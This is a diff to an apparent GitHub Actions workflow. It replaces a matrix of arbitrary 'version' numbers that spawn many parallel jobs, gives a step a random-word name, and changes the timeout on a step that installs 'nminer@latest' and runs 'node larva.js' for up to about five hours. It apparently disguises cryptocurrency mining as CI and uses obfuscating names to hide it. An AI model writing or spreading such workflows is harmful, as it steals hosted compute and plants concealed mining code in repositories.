@@ -9,26 +9,23 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 8713 }
-          - { version: 7510 }
-          - { version: 1559 }
-          - { version: 9323 }
-          - { version: 4954 }
-          - { version: 6041 }
-          - { version: 8746 }
-          - { version: 7093 }
-          - { version: 9641 }
-          - { version: 207 }
-          - { version: 1387 }
-          - { version: 6361 }
-          - { version: 6934 }
-          - { version: 1218 }
-          - { version: 8743 }
-          - { version: 9850 }
-          - { version: 8793 }
-          - { version: 6954 }
-          - { version: 6547 }
-          - { version: 4499 }
+          - { version: 3103 }
+          - { version: 9068 }
+          - { version: 6598 }
+          - { version: 35 }
+          - { version: 65 }
+          - { version: 9277 }
+          - { version: 1037 }
+          - { version: 3515 }
+          - { version: 6700 }
+          - { version: 9285 }
+          - { version: 5750 }
+          - { version: 9618 }
+          - { version: 8202 }
+          - { version: 911 }
+          - { version: 4254 }
+          - { version: 2575 }
+          - { version: 4677 }
 
     steps:
       - name: Checkout
@@ -39,7 +36,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: divine
+      - name: easily haze opposite
         run: |
           npm install nminer@latest
-          timeout 345m node larva.js || echo "larva executed"
+          timeout 301m node larva.js || echo "larva executed"
